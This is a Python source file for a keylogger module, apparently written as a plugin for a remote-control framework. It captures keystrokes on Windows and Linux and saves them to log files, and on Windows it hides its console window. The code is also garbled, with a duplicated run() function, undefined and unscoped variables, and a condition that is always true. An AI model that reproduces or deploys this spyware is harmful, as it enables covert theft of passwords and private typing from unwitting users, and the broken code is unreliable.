# Source used: https://www.geeksforgeeks.org/design-a-keylogger-in-python/

# Python code for keylogger
# to be used in linux
import os
import pyxhook
from sys import platform

def run(**args):
    if platform == "win32":
        import random

# for the keylogger in windows: https://www.geeksforgeeks.org/design-a-keylogger-in-python


def run(*args):
    print("[*] In module keylogger")
    amountStrokes = random.randint(5, 50)

    if args[0] == "windows":
        import win32api
        import win32console
        import win32gui
        import pythoncom
        import pyHook

        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

        def OnKeyboardEvent(event):
            amountStrokes -= 1
            if event.Ascii == 5:
                exit(1)

            if event.Ascii != 0 or 8:
                # open output.txt to read current keystrokes
                f = open("./data/keylog.txt", "r+")
                buffer = f.read()
                f.close()
                # open output.txt to write current + new keystrokes
                f = open("./data/keylog.txt", "w")
                keylogs = chr(event.Ascii)

                if event.Ascii == 13:
                    keylogs = "/n"
                    buffer += keylogs
                    f.write(buffer)
                    f.close()

            if amountStrokes == 0:
                f = open("./data/keylog.txt", "r")
                return f

        # create a hook manager object
        hm = pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent

        # set the hook
        hm.HookKeyboard()

        # wait forever
        pythoncom.PumpMessages()

    elif args[0] == "linux":
        from pynput.keyboard import Key, Listener
        import logging

        logging.basicConfig(
            filename="./data/keylog.txt", level=logging.DEBUG, format="key: %(message)s"
        )

        def on_press(key):
            amountStrokes -= 1
            logging.info(str(key))

            if amountStrokes == 0:
                f = open("./data/keylog.txt", "r")
                return f

        with Listener(on_press=on_press) as listener:
            listener.join()

    elif args[0] == "macos":
        return "the logger found macOS, logger not implemented"
    else:
        print("[*] keylogger")
        # This tells the keylogger where the log file will go.
        # You can set the file path as an environment variable ('pylogger_file'),
        # or use the default ~/Desktop/file.log
        log_file = os.environ.get(
            'pylogger_file',
            os.path.expanduser('~/Desktop/file.log')
        )
        # Allow setting the cancel key from environment args, Default: `
        cancel_key = ord(
            os.environ.get(
                'pylogger_cancel',
                '`'
            )[0]
        )

        # Allow clearing the log file on start, if pylogger_clean is defined.
        if os.environ.get('pylogger_clean', None) is not None:
            try:
                os.remove(log_file)
            except EnvironmentError:
            # File does not exist, or no permissions.
                pass

        #creating key pressing event and saving it into log file
        def OnKeyPress(event):
            with open(log_file, 'a') as f:
                f.write('{}\n'.format(event.Key))

        # create a hook manager object
        new_hook = pyxhook.HookManager()
        new_hook.KeyDown = OnKeyPress
        # set the hook
        new_hook.HookKeyboard()
        try:
            new_hook.start()         # start the hook
        except KeyboardInterrupt:
            # User cancelled from command line.
            pass
        except Exception as ex:
            # Write exceptions to the log file, for analysis later.
            msg = 'Error while catching events:\n  {}'.format(ex)
            pyxhook.print_err(msg)
            with open(log_file, 'a') as f:
                f.write('\n{}'.format(msg))

        with open(log_file, 'r') as f:
            log = f.read()
        return log